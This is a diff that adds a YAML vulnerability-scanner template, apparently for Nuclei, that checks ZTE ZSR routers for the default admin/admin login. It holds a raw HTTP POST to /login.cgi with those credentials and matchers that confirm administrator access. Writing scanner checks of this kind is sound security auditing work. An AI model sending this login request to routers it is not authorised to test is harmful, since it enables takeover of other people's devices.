@@ -1,0 +1,28 @@
+id: zte-zsr-login-default-password
+
+info:
+  name: ZTE ZSR Router Login Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ZTE ZSR routers contain a default password vulnerability that allows attackers to control the entire platform using administrator privileges, exposing core functions of the system.
+  tags: default-password, router
+
+http:
+  - raw:
+      - |
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        Username=admin&Password=admin&EncryptType=plain&Language=chinese&MainFile=/pagefile/webgui/html/chinese/index.htm
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "menuTab"
